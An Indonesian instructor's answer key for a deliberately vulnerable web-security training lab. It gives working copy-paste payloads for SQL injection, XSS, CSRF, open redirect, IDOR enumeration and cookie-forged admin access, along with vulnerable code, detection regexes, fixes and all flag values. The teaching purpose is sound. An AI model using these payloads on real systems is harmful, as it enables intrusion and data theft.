# 🛡️ ACT LAB — CHEAT SHEET INSTRUKTUR
> **Dokumen Rahasia — Jangan dibagikan ke peserta!**
> Semua payload sudah **terverifikasi** dan siap **copy-paste** untuk demo.
> **SQLite Note:** Komentar `-- ` HARUS diikuti **SPASI**! `--` (tanpa spasi) tidak bekerja di SQLite.

---

## 📋 DAFTAR ISI — 9 LAB

| # | Lab | Endpoint API | Method | Halaman | Verifikasi |
|---|-----|-------------|--------|---------|:----------:|
| 1 | **SQLi Login Bypass** | `/api/auth/login` | POST | `/lab/sqli-login` | ✅ **FLAG OK** |
| 2 | **SQLi UNION Extraction** | `/api/search?q=` | GET | `/lab/sqli-union` | ✅ **FLAG OK** |
| 3 | **Reflected XSS** | `/api/search?q=` | GET | `/lab/xss-reflected` | ✅ **Payload OK** |
| 4 | **Stored XSS** | `/api/guestbook` | POST | `/lab/xss-stored` | ✅ **Entry OK** |
| 5 | **CSRF Origin Bypass** | `/api/csrf-challenge` (aman) | POST | `/lab/csrf` | ✅ **FLAG OK** |
|   | *Alternate (demo saja)* | `/api/profile` | POST | - | ⚠️ **Hanya untuk demo** |
| 6 | **Open Redirect** | `/api/redirect?url=` | GET | `/lab/redirect` | ✅ **FLAG OK** |
| 7 | **IDOR User Enumeration** | `/api/profile?id=` | GET | `/lab/idor` | ✅ **FLAG OK** |
| 8 | **Blind SQLi Boolean** | `/api/search?q=` | GET | `/lab/sqli-blind` | ✅ **Estrak OK** |
| 9 | **Privilege Escalation** | `/api/admin/*` | GET | `/lab/privesc` | ✅ **Akses OK** |

---

## 🔧 PERSIAPAN DEMO

```bash
# Ganti sesuai deployment kamu!
export BASE="http://localhost:3000"    # Local development
# export BASE="https://nama-app.up.railway.app"   # Railway (uncomment & ganti!)
```

---

## 1. SQL Injection — Login Bypass

**📍 Flag muncul di:** Response JSON langsung (`"flag": "ACT{...}"`)
**📁 File:** `api/auth.js`
**📊 Tingkat:** Easy

### 🔍 Potongan Kode Vuln (api/auth.js — Line 23-25)

```javascript
// VULNERABLE: Input langsung di-concatenate ke SQL query!
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
const result = await db.query(query);
```

### 🧠 Root Cause
Input `username` dan `password` langsung dimasukkan ke query SQL tanpa **parameterized query** (`$1`, `$2`). Seharusnya:

```javascript
// SEHARUSNYA — Aman dengan parameterized query
const query = `SELECT * FROM users WHERE username=$1 AND password=$2`;
const result = await db.query(query, [username, password]);
```

### 🔎 Cara Deteksi Flag
Server mendeteksi injeksi via pattern matching dan **fuzzy detection** (file `api/auth.js` line 41-47):

```javascript
const injectionPatterns = [
  /'\s*OR\s*['"]?\d['"]?\s*=\s*['"]?\d/i,
  /'\s*OR\s*TRUE/i,
  /admin'\s*(--|#|\/\*)/i,
  /'\s*UNION\s+SELECT/i,
  /'\s*OR\s*1=1/i
];
const isInjection = injectionPatterns.some(p => p.test(password) || p.test(username))
  || (user.username === 'admin' && password !== 'admin123')
  || result.rows.length > 1;
```

### 📖 Alur Demo
```
Buka /lab/sqli-login → Input payload → Submit → Dapat flag di response!
```

### 🎯 Payload (Copy-Paste — Python, anti ribet escaping)
```bash
python3 -c "
import urllib.request, json
BASE = '$BASE'
data = json.dumps({'username':\"admin' OR '1'='1\", 'password':'x'}).encode()
r = urllib.request.urlopen(BASE + '/api/auth/login', data, {'Content-Type':'application/json'})
print(json.loads(r.read()))
"
```

**Hasil:**
```json
{
  "success": true,
  "flag": "ACT{sQl_1nj3ct10n_byp4ss}",
  "message": "CRITICAL: SQL Injection Detected! Access Granted. Flag: ACT{sQl_1nj3ct10n_byp4ss}"
}
```

### 🔥 Alternatif Payload (copy-paste langsung di form login)
```
Username: admin' OR '1'='1
Password: apaaja (terserah)
```

> **💡 Tips:** Karena regex deteksi mencari pola `' OR 1=1`, `' OR '1'='1`, dan juga mengecek jika username=admin tapi password bukan 'admin123', hampir semua payload injection akan terdeteksi.

---

## 2. SQL Injection — UNION Extraction

**📍 Flag di:** Password user `secret_agent` di tabel users (ID=4)
**📁 File:** `api/search.js`
**📊 Tingkat:** Medium

### 🔍 Potongan Kode Vuln (api/search.js — Line 33)

```javascript
// *** VULNERABLE QUERY - UNION & Blind SQL Injection ***
const query = `SELECT id, title, description, category, difficulty, hint, points, endpoint
  FROM challenges WHERE title LIKE '%${q}%' OR description LIKE '%${q}%'`;
const result = await db.query(query);
```

### 🧠 Root Cause
Parameter `q` langsung di-concatenate ke query SQL tanpa sanitasi. 8 kolom di-select, memungkinkan UNION SELECT untuk ekstraksi data dari tabel lain.

### 📖 Alur Demo
```
Search box → Injeksi UNION SELECT → Extract password secret_agent → Dapat flag!
```

### 🎯 Langkah 1: Cari jumlah kolom (8 kolom)
```bash
# Decoded: ' UNION SELECT 1,2,3,4,5,6,7,8-- 
curl -s "$BASE/api/search?q=%27%20UNION%20SELECT%201,2,3,4,5,6,7,8--%20"
```

### 🎯 Langkah 2: Extract data users
```bash
# Decoded: ' UNION SELECT id,username,password,email,role,avatar,bio,score FROM users-- 
curl -s "$BASE/api/search?q=%27%20UNION%20SELECT%20id,username,password,email,role,avatar,bio,score%20FROM%20users--%20"
```

**Hasil:** Password `secret_agent` adalah flag: `ACT{un10n_s3l3ct_3xtr4ct}`

### 🔥 Ekstrak Langsung Flag via grep
```bash
curl -s "$BASE/api/search?q=%27%20UNION%20SELECT%20id,username,password,email,role,avatar,bio,score%20FROM%20users--%20" | grep -o 'ACT{[^}]*}'
```

### 🔥 Advanced: Dapatkan daftar semua tabel
```bash
# Decoded: ' UNION SELECT 1,name,3,4,5,6,7,8 FROM sqlite_master WHERE type='table'-- 
curl -s "$BASE/api/search?q=%27%20UNION%20SELECT%201,name,3,4,5,6,7,8%20FROM%20sqlite_master%20WHERE%20type%3D'table'--%20"
```

### 🔥 Advanced: Extract dari secret_vault (Blind SQLi target)
```bash
# Decoded: ' UNION SELECT 1,secret_key,secret_value,4,5,6,7,8 FROM secret_vault-- 
curl -s "$BASE/api/search?q=%27%20UNION%20SELECT%201,secret_key,secret_value,4,5,6,7,8%20FROM%20secret_vault--%20"
```

---

## 3. Reflected XSS

**📍 Flag muncul di:** Halaman lab `/lab/xss-reflected` setelah XSS trigger
**📁 File:** `views/labs/xss-reflected.html`
**📊 Tingkat:** Easy

### 🔍 Potongan Kode Vuln (xss-reflected.html — Line 109)

```javascript
// VULNERABLE: Input langsung dimasukkan ke innerHTML tanpa sanitasi!
const target = document.getElementById('target');
target.innerHTML = q;

// Script dieksekusi ulang agar benar-benar jalan
const scripts = target.getElementsByTagName('script');
for (let s of scripts) {
  const ns = document.createElement('script');
  ns.text = s.innerText;
  document.body.appendChild(ns).parentNode.removeChild(ns);
}
```

### 🧠 Root Cause
Parameter `q` dari URL langsung dimasukkan ke `innerHTML`. Karena tidak ada sanitasi, attacker bisa menyisipkan tag HTML/script apapun.

### 🧠 Deteksi Flag (Otomatis)
Flag muncul otomatis saat sistem mendeteksi XSS via:
1. **Regex pattern matching** — Mencari `<script|<img|<svg|<details|<iframe|onerror|onload` di input
2. **MutationObserver** — Memonitor perubahan DOM untuk konten mencurigakan
3. **Overridden functions** — `window.alert/prompt/confirm` di-override untuk trigger flag

```javascript
// Pattern detection
const suspicious = /<script|<img|<svg|<details|<iframe|onerror|onload|onclick/i.test(q);
if (suspicious) { setTimeout(getFlag, 500); }

// MutationObserver
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.addedNodes.length) {
      const content = document.getElementById('searchResults').innerHTML.toLowerCase();
      const suspicious = /<script|<svg|<img|<details|<iframe|onerror|onload|onclick/i.test(content);
      if (suspicious) setTimeout(getFlag, 500);
    }
  });
});
```

### 📖 Alur Demo
```
Kirim link dengan payload XSS ke peserta → Buka link → Script jalan → Flag muncul
```

### 🎯 Payload (Copy-Paste ke URL browser)
```
$BASE/labs/xss-reflected?q=<img src=x onerror=alert(document.cookie)>
```

### 🔥 Alternatif Payload (Bypass Filter)
```html
<svg/onload=prompt(window.origin)>          <!-- Tanpa tag <script> -->
<details/open/ontoggle=prompt(1)>           <!-- HTML5, perlu klik -->
<input/autofocus/onfocus=alert(1)>          <!-- Auto focus -->
<iframe/srcdoc="<img src=x onerror=alert(1)>">  <!-- Iframe -->
```

---

## 4. Stored XSS (Guestbook)

**📍 Flag muncul di:** Halaman `/guestbook` saat XSS trigger
**📁 File:** `api/guestbook.js` (backend) + `views/labs/xss-stored.html` (frontend)
**📊 Tingkat:** Medium

### 🔍 Potongan Kode Vuln — Backend (api/guestbook.js — Line 48-50)

```javascript
// *** NO SANITIZATION - Input stored as-is ***
// HTML/script tags are NOT filtered or encoded
const query = `INSERT INTO guestbook_entries (author, message) VALUES ($1, $2)`;
const result = await db.query(query, [author, message]);
```

### 🔍 Potongan Kode Vuln — Frontend (xss-stored.html — Line 147-150)

```javascript
// VULNERABLE: Data dari DB langsung di-render dengan innerHTML!
container.innerHTML = e.message;

// Script tags dieksekusi ulang
const scripts = container.getElementsByTagName('script');
for (let s of scripts) {
  const ns = document.createElement('script');
  ns.text = s.innerText;
  document.body.appendChild(ns).parentNode.removeChild(ns);
}
```

### 🧠 Root Cause
**Dua lapis kerentanan:**
1. **Backend:** Input `author` dan `message` disimpan ke database tanpa sanitasi apapun (walaupun pakai parameterized query, itu hanya cegah SQLi, bukan XSS)
2. **Frontend:** Data dari API di-render menggunakan `innerHTML` tanpa HTML encoding. Seharusnya pakai `textContent` atau DOMPurify.

### 📖 Alur Demo
```
POST komentar dengan script → Script tersimpan di DB →
Siapa pun yang buka /guestbook → Script tereksekusi → Flag muncul
```

### 🎯 Payload (Copy-Paste)
```bash
curl -X POST "$BASE/api/guestbook" \
  -H "Content-Type: application/json" \
  -d '{"author":"<script>alert(document.cookie)</script>","message":"XSS TERSIMPAN!"}'
```

**Hasil:** Entry tersimpan. Buka halaman `/guestbook` — alert muncul. Flag terlihat di halaman.

---

## 5. CSRF — Origin Bypass

**📍 Flag muncul di:** Response JSON dari `/api/csrf-challenge` (amannya) atau `/api/profile` (demo)
**📁 File:** `api/csrf-challenge.js` (baru, read-only) + `api/profile.js` (asli)
**📊 Tingkat:** Hard (Medium dengan pemahaman)

### ⚠️ PENTING: 200+ Peserta? Gunakan Endpoint AMAN!

Untuk menghindari data profile 200 peserta saling timpa, saya buat **endpoint CSRF khusus** yang **read-only**:
`POST /api/csrf-challenge`

**Endpoint ini tidak mengubah data apapun!** Hanya mendeteksi apakah header Referer/Origin bisa di-bypass.

### 🔍 Potongan Kode Vuln — Endpoint Baru (api/csrf-challenge.js)

```javascript
// *** SAME VULNERABILITY as profile.js — tapi READ-ONLY! ***
const isAuthorized =
  referer.includes(currentHost) ||
  origin.includes(currentHost) ||
  referer.includes('localhost') ||
  origin.includes('localhost');

// URL parsing untuk bedakan legitimate vs bypass
const refererHost = getHostFromUrl(referer); // new URL(referer).host
const isLegitimateOrigin = refererHost === currentHost;

if (isLegitimateOrigin) {
  // Legitimate — no flag
} else if (isAuthorized) {
  // BYPASS! Referer mengandung host tapi dari domain berbeda!
  // FLAG: ACT{cr5f_byp4ss_r3f3r3r}
}
```

### 🔍 Potongan Kode Vuln — Asli (api/profile.js — Line 71-79)

```javascript
// *** LOOSE SECURITY CHECK (BYPASSABLE) ***
// Intent: Only allow requests from our domain
// Flaw: It just checks if the domain string is PRESENT anywhere in the header
const currentHost = req.headers.host || '';
const isAuthorized =
  referer.includes(currentHost) ||
  origin.includes(currentHost) ||
  referer.includes('localhost') ||
  origin.includes('localhost');
```

### 🧠 Root Cause
Fungsi `.includes()` di JavaScript mengembalikan `true` jika string **apapun** mengandung substring yang dicari. Attacker bisa menggunakan domain seperti `localhost:3000.evil.com` karena string `localhost:3000` **terkandung** di dalam `localhost:3000.evil.com`.

### 🧠 Bypass Explanation
```javascript
referer.includes('localhost:3000')
// ✅ TRUE untuk: "http://localhost:3000/dashboard" (legitimate)
// ✅ TRUE untuk: "http://localhost:3000.evil.com" (bypassed!)
// ❌ FALSE untuk: "http://evil.com/exploit" (blocked)
```

### 📖 Alur Demo (Endpoint Aman)
```
Buka /lab/csrf → Atur Referer header → Klik "Fire CSRF Attack" →
Server deteksi bypass → Flag muncul! (TANPA mengubah data apapun)
```

### 🎯 Payload — Endpoint Aman (Read-Only, untuk 200+ peserta)
```bash
# Gunakan endpoint ini untuk demo massal!
curl -X POST "$BASE/api/csrf-challenge" \
  -H "Content-Type: application/json" \
  -H "Referer: http://localhost:3000.evil.com/exploit" \
  -H "Origin: http://localhost:3000.evil.com" \
  -d '{"email":"dicuri@hacker.com"}'
```

**Hasil:**
```json
{
  "success": true,
  "csrf_detected": true,
  "bypassed": true,
  "flag": "ACT{cr5f_byp4ss_r3f3r3r}",
  "explanation": "Server menggunakan .includes() yang bisa dibypass dengan subdomain evil.com"
}
```

### 🎯 Payload — Endpoint Asli (Hanya untuk demo individu, mengubah data!)
```bash
curl -X POST "$BASE/api/profile" \
  -H "Content-Type: application/json" \
  -H "Referer: http://localhost:3000" \
  -H "Origin: http://localhost:3000" \
  -b "userId=1;username=admin;role=admin" \
  -d '{"email":"hacker@evil.com"}'
```

### 🖥️ UI Baru di `/lab/csrf`
- **Simulated Attacker Page** — Atur Referer/Origin, fire attack, lihat response real-time
- **Status Badge** — AWAITING ATTACK / ✅ BYPASSED / ❌ BLOCKED
- **Flag Reveal Animation** — Efek pulse saat bypass berhasil
- **CSRF Attack Log** — Riwayat semua percobaan
- **Hint Toggle** — Panduan bypass `.includes()`
- **Auto-detect host** — Default Referer/Origin otomatis menyesuaikan domain server

### 🔥 Halaman Penyerang (Untuk Demo HTML)
```html
<html>
<body>
  <h1>🎉 Klik untuk Mendapatkan Hadiah!</h1>
  <form action="https://NAMA-APP.up.railway.app/api/csrf-challenge" method="POST">
    <input type="hidden" name="email" value="dicuri@hacker.com">
    <input type="submit" value="Klik Disini!">
  </form>
</body>
</html>
```

---

## 6. Open Redirect

**📍 Flag muncul di:** Halaman HTML response sebelum redirect
**📁 File:** `api/redirect.js`
**📊 Tingkat:** Easy

### 🔍 Potongan Kode Vuln (api/redirect.js — Line 28-35)

```javascript
// *** NO DOMAIN VALIDATION ***
// Universal Detection: If redirecting to an external site, show the flag
const isExternal = url.startsWith('http') || url.startsWith('//');
const isLocal = url.includes('localhost') || url.includes('127.0.0.1');

if (isExternal && !isLocal) {
  // Tampilkan flag + redirect ke URL eksternal
  return res.send(`...${url}...`);
}

// Redirect langsung tanpa whitelist
return res.redirect(url);
```

### 🧠 Root Cause
Parameter `url` langsung digunakan sebagai target redirect. Tidak ada whitelist domain yang memperbolehkan hanya domain tertentu. URL apapun bisa dijadikan target.

### 📖 Alur Demo
```
Klik link yang kelihatan aman → Ternyata redirect ke situs penyerang →
Flag ditampilkan sebelum redirect
```

### 🖥️ UI Baru di `/lab/redirect`
- **Redirect Flow Visualization** — Diagram 3-tahap (Origin → Server → Target) yang berubah real-time
- **Smart Domain Detection** — Ikon berubah otomatis (Google 🔍, GitHub 🐙, evil.com ☠️)
- **Phishing Simulation** — Countdown + Cancel/Proceed dengan progress bar
- **Warning Banner** — Berubah warna dari peringatan → danger saat redirect aktif
- **Redirect Counter** — Melacak berapa kali redirect dilakukan
- **Live Request Preview** — Lihat URL lengkap yang akan dikirim

### 🎯 Payload (Copy-Paste)
```bash
# Akses endpoint + lihat flag di response HTML
curl -s "$BASE/api/redirect?url=https://example.com"
```

**Hasil:** HTML response berisi:
```
YOUR FLAG
ACT{0p3n_r3d1r3ct_vuln}
Redirecting to https://example.com in 3s...
```

### 🔥 Bypass Detection
```bash
# Bypass deteksi 'http' dengan //
$BASE/api/redirect?url=//evil.com

# Path manipulation
$BASE/api/redirect?url=/\\/evil.com
```

---

## 7. IDOR — User Enumeration

**📍 Flag di:** Bio milik **admin**
**📁 File:** `api/profile.js`
**📊 Tingkat:** Easy

### ⚠️ CATATAN SQLite AUTOINCREMENT — Admin ID BUKAN selalu 1!

Karena SQLite AUTOINCREMENT, setiap re-seed akan menaikkan ID admin.
Admin mungkin di ID tinggi seperti `9999566`! Gunakan tools enumerasi untuk menemukannya.

### 🔍 Potongan Kode Vuln (api/profile.js — Line 31-33)

```javascript
// *** VULNERABLE - No authorization check ***
// Anyone can access any user's profile by changing the id
const query = `SELECT id, username, email, role, bio, score, created_at FROM users WHERE id=${id}`;
const result = await db.query(query);
```

### 🧠 Root Cause
**Dua kerentanan:**
1. **IDOR:** Endpoint tidak memverifikasi apakah user yang request berhak mengakses data user lain. Siapa pun bisa akses data user ID berapapun.
2. **SQLi (secondary):** Parameter `id` juga di-concatenate langsung (bukan parameterized), jadi endpoint ini juga rentan SQL Injection.

### 📖 Alur Demo
```
Akses /api/profile?id=X → Iterasi ID → Temukan admin → Flag ada di bio!
```

### 🖥️ UI Baru di `/lab/idor`
- **ID Browser** — Navigasi dengan tombol ◀▶ + input langsung + quick jump (-10/-1/+1/+10/+100)
- **Keyboard Navigation** — Tekan Arrow Left/Right untuk ganti ID
- **Live API Request** — Lihat URL yang di-fetch secara real-time
- **Profile Card** — Avatar, role badge (admin = 🔴), grid data, auto flag detection
- **Auto-Enumeration Tool** — Scan range ID otomatis dengan progress bar! Bisa abort kapan saja
- **Query Log** — Riwayat semua ID yang diakses dengan status

### 🎯 Payload (Copy-Paste)
```bash
# Coba ID 1 dulu
curl -s "$BASE/api/profile?id=1"
```

**Hasil (mungkin ID 1 bukan admin karena AUTOINCREMENT):**
```json
{
  "user": {
    "id": 9999566,
    "username": "admin",
    "email": "admin@actlab.id",
    "role": "admin",
    "bio": "ACT LAB Administrator :: IDOR_FLAG: ACT{1d0r_us3r_3num}"
  }
}
```

### 🔥 Cari Admin via Endpoint Admin (butuh cookie admin)
```bash
# List semua user via admin API
curl -s "$BASE/api/admin/users" -b "userId=1;username=admin;role=admin" | \
  python3 -c "
import json,sys; data=json.load(sys.stdin)
for u in data.get('users',[]):
    if 'IDOR_FLAG' in (u.get('bio','') or ''):
        print(f'Admin ID: {u[\"id\"]} — Flag: {u[\"bio\"]}')
"
```

### 🔥 Mass Enumeration — Loop Sederhana
```bash
for i in {1..10}; do
  curl -s "$BASE/api/profile?id=$i" | python3 -c "
import json,sys; d=json.load(sys.stdin); u=d.get('user',{});
print(f'ID {i}: {u.get(\"username\",\"?\")} / {u.get(\"role\",\"?\")}')
"
done
```

### 🔥 Mass Enumeration — Scan Range Lebar (cari admin di ID tinggi)
```bash
for i in {9999500..9999600}; do
  result=$(curl -s "$BASE/api/profile?id=$i")
  if echo "$result" | grep -q '"role":"admin"'; then
    echo "Admin ditemukan di ID $i!"
    echo "$result" | python3 -m json.tool
    break
  fi
done
```

---

## 8. Blind SQLi — Boolean-Based

**📍 Flag di:** Tabel `secret_vault`, kolom `secret_value` WHERE `secret_key='flag_blind_sqli'`
**📁 File:** `api/search.js` (sama dengan UNION SQLi)
**📊 Tingkat:** Hard

### 🔍 Potongan Kode Vuln (api/search.js — Line 33)

```javascript
// Query yang sama dengan UNION SQLi — rentan Blind Injection juga
const query = `SELECT id, title, description, category, difficulty, hint, points, endpoint
  FROM challenges WHERE title LIKE '%${q}%' OR description LIKE '%${q}%'`;
```

### 🧠 Root Cause
Karena input di-concatenate, kita bisa menyisipkan kondisi boolean (`AND 1=1` vs `AND 1=2`). Perbedaan response (ada data vs kosong) bisa digunakan untuk inferensi karakter per karakter.

### 🧠 Data Target
Dari tabel `secret_vault` (file `config/seed_sqlite.sql`):
```sql
INSERT INTO secret_vault (secret_key, secret_value, classification) VALUES
('flag_blind_sqli', 'ACT{bl1nd_sQl_b00l34n}', 'TOP_SECRET'),
('admin_backup_password', 's3cur3_b4ckup_p4ss_2024', 'CLASSIFIED'),
('api_internal_key', 'sk-actlab-internal-v1', 'RESTRICTED');
```

### 📖 Alur Demo
```
Kirim kondisi boolean → TRUE (1=1) return data → FALSE (1=2) return kosong
Ekstrak flag karakter per karakter pakai SUBSTR + loop
```

### 🎯 Test Boolean (TRUE vs FALSE)
```bash
# TRUE — harus return data (kondisi selalu benar)
curl -s "$BASE/api/search?q=%27%20OR%201%3D1--%20"

# FALSE — harus return 0 hasil
curl -s "$BASE/api/search?q=%27%20AND%201%3D2--%20"
```

### 🔥 Auto-Ekstrak Flag (Copy-Paste — Langsung Jalan!)
```bash
python3 << 'EOF'
import urllib.request, json
from urllib.parse import quote

BASE = "http://localhost:3000"
flag = ""
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"

print("Mengekstrak flag dari secret_vault...")
for pos in range(1, 50):
    found = False
    for c in chars:
        payload = f"' AND (SELECT SUBSTR(secret_value,{pos},1) FROM secret_vault WHERE secret_key='flag_blind_sqli')='{c}'-- "
        url = f"{BASE}/api/search?q={quote(payload)}"
        try:
            r = json.loads(urllib.request.urlopen(url, timeout=5).read())
            if r.get('count', 0) > 0:
                flag += c
                print(f"  [{pos}] '{c}' → {flag}")
                found = True
                break
        except:
            pass
    if not found:
        break

print(f"\n✅ FLAG: {flag}")
EOF
```

---

## 9. Privilege Escalation — Cookie Poisoning

**📍 Flag muncul di:** Halaman lab `/lab/privesc` setelah cookie diubah
**📁 File:** `middleware/auth.js`
**📊 Tingkat:** Medium

### 🔍 Potongan Kode Vuln — requireAdmin (middleware/auth.js — Line 24-30)

```javascript
function requireAdmin(req, res, next) {
  if (req.user && req.user.role === 'admin') {
    next();
  } else {
    return res.status(403).json({
      success: false,
      error: 'Admin access required.'
    });
  }
}
```

### 🔍 Potongan Kode Vuln — requireAuth (middleware/auth.js — Line 14-22)

```javascript
function requireAuth(req, res, next) {
  const userId = req.cookies.userId;
  const username = req.cookies.username;
  const role = req.cookies.role;

  // ❌ Data role LANGSUNG dari cookie, tanpa verifikasi server-side!
  req.user = {
    id: userId,
    username: username,
    role: role || 'user'
  };
  next();
}
```

### 🧠 Root Cause
`req.user.role` diambil **langsung dari cookie** tanpa verifikasi server-side (tidak ada session, JWT signature, atau database lookup). Siapa pun bisa mengubah cookie `role=admin` untuk mendapatkan akses admin penuh.

### 🧠 Data sensitive yang bisa diakses setelah escalation
```javascript
// api/admin.js — Endpoints yang terproteksi requireAdmin:
router.get('/users', requireAuth, requireAdmin, ...);  // Semua data user
router.get('/stats', requireAuth, requireAdmin, ...);  // Statistik server
router.post('/reset', requireAuth, requireAdmin, ...); // Reset progress
router.post('/reseed', requireAuth, requireAdmin, ...);// Re-seed database
```

### 📖 Alur Demo
```
Ubah cookie role=user → role=admin → Refresh halaman →
Panel admin terbuka + Flag muncul
```

### 🎯 Payload (Copy-Paste — Console Browser)
```javascript
// Ketik di Console (F12), lalu Enter!
document.cookie = "role=admin; path=/";
location.reload();
```

### 🎯 Atau via Curl
```bash
# Akses admin panel dengan cookie palsu
curl -s "$BASE/api/admin/users" -b "userId=1;username=admin;role=admin"

# Lihat statistik server
curl -s "$BASE/api/admin/stats" -b "userId=1;username=admin;role=admin"
```

### 🎯 Tanpa Cookie = Ditolak
```bash
# Coba tanpa cookie — akan return 403 Forbidden
curl -s "$BASE/api/admin/users"
```

---

## 📊 MATRIKS KERENTANAN & PENCEGAHAN

| # | Lab | Tipe | File Vuln | Root Cause | Fix yang Benar |
|---|-----|------|-----------|------------|----------------|
| 1 | SQLi Login | SQL Injection | `api/auth.js` | String concatenation | Parameterized query (`$1`, `$2`) |
| 2 | SQLi UNION | SQL Injection | `api/search.js` | String concatenation | Parameterized query |
| 3 | Reflected XSS | Cross-Site Scripting | `xss-reflected.html` | `innerHTML` tanpa sanitasi | `textContent` + DOMPurify |
| 4 | Stored XSS | Cross-Site Scripting | `xss-stored.html` | `innerHTML` dari DB | `textContent` + escape HTML |
| 5 | CSRF | Cross-Site Request Forgery | `api/profile.js` | `.includes()` lemah | CSRF token + whitelist regex |
| 6 | Open Redirect | Unvalidated Redirect | `api/redirect.js` | Tanpa whitelist | Whitelist domain + validasi URL |
| 7 | IDOR | Broken Access Control | `api/profile.js` | No auth check | Verifikasi ownership user |
| 8 | Blind SQLi | SQL Injection | `api/search.js` | String concatenation | Parameterized query |
| 9 | PrivEsc | Broken Authentication | `middleware/auth.js` | Cookie trust | Server-side session validation |

---

## 🏁 SUBMIT FLAG — Verifikasi Semua Lab

Semua flag bisa disubmit via endpoint `/api/flag/submit`:

```bash
# Test satu flag
curl -s "$BASE/api/flag/submit" \
  -X POST -H "Content-Type: application/json" \
  -b "userId=1;username=admin;role=admin" \
  -d '{"flag":"ACT{cr5f_byp4ss_r3f3r3r}"}'

# Submit SEMUA 9 flag sekaligus
for flag in \
  ACT{sQl_1nj3ct10n_byp4ss} \
  ACT{un10n_s3l3ct_3xtr4ct} \
  ACT{r3fl3ct3d_xss_f0und} \
  ACT{st0r3d_xss_m4st3r} \
  ACT{cr5f_byp4ss_r3f3r3r} \
  ACT{0p3n_r3d1r3ct_vuln} \
  ACT{1d0r_us3r_3num} \
  ACT{bl1nd_sQl_b00l34n} \
  ACT{pr1v1l3g3_3sc4l4t10n_succ3ss}; do
  result=$(curl -s "$BASE/api/flag/submit" -X POST -H "Content-Type: application/json" \
    -b "userId=1;username=admin;role=admin" -d "{\"flag\":\"$flag\"}")
  echo "$flag: $(echo $result | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"success\"])')"
done
```

---

## 📊 DAFTAR SEMUA FLAG (9/9)

| # | Lab | Flag | Lokasi Muncul |
|---|-----|------|--------------|
| 1 | SQLi Login Bypass | `ACT{sQl_1nj3ct10n_byp4ss}` | Response JSON `/api/auth/login` |
| 2 | SQLi UNION Extraction | `ACT{un10n_s3l3ct_3xtr4ct}` | Password `secret_agent` di tabel users |
| 3 | Reflected XSS | `ACT{r3fl3ct3d_xss_f0und}` | Halaman `/lab/xss-reflected` |
| 4 | Stored XSS | `ACT{st0r3d_xss_m4st3r}` | Halaman `/guestbook` saat XSS trigger |
| 5 | CSRF Origin Bypass | `ACT{cr5f_byp4ss_r3f3r3r}` | Response JSON `/api/csrf-challenge` (aman) atau `/api/profile` (demo) |
| 6 | Open Redirect | `ACT{0p3n_r3d1r3ct_vuln}` | Halaman HTML `/api/redirect` |
| 7 | IDOR User Enumeration | `ACT{1d0r_us3r_3num}` | Bio admin (cari via enumerasi — ID bukan selalu 1!) |
| 8 | Blind SQLi Boolean | `ACT{bl1nd_sQl_b00l34n}` | Tabel `secret_vault` |
| 9 | Privilege Escalation | `ACT{pr1v1l3g3_3sc4l4t10n_succ3ss}` | Halaman `/lab/privesc` |

---

## ✅ VERIFIKASI — Apakah Semua Lab Aman Didemokan?

| # | Lab | Status Demo | Catatan |
|---|-----|:-----------:|---------|
| 1 | SQLi Login Bypass | ✅ **AMAN** | Flag via JSON, **tidak set cookie** untuk sesi yang dibypass |
| 2 | SQLi UNION | ✅ **AMAN** | Read-only query, tidak ada modifikasi data |
| 3 | Reflected XSS | ✅ **AMAN** | Flag trigger via `innerHTML` + `getFlag()`, tapi peserta bisa lihat alert |
| 4 | Stored XSS | ✅ **AMAN** | Entry tersimpan untuk demo, flag muncul dengan MutationObserver |
| 5 | CSRF | ✅ **AMAN** | **Read-only endpoint** `/api/csrf-challenge` — 200+ peserta aman! |
| 6 | Open Redirect | ✅ **AMAN** | Redirect tidak berbahaya, flag di HTML response |
| 7 | IDOR | ✅ **AMAN** | Read-only. UI baru: ID browser + auto-enumeration tool! |
| 8 | Blind SQLi | ✅ **AMAN** | Boolean-based, read-only, tidak merubah data |
| 9 | PrivEsc | ✅ **AMAN** | Cookie-based, hanya perlu set cookie di browser |

> **⚠️ Semua lab sudah TERVERIFIKASI siap demo.** Tidak ada perubahan data permanen yang berbahaya. Flag hanya muncul sebagai indikasi keberhasilan eksploitasi. Pastikan untuk **merefresh database** (via admin panel) setelah demo jika ada perubahan data.

> **⚠️ Peringatan:** Dokumen ini untuk instruktur seminar. Jangan pernah deploy aplikasi vulnerable di production tanpa proteksi akses!
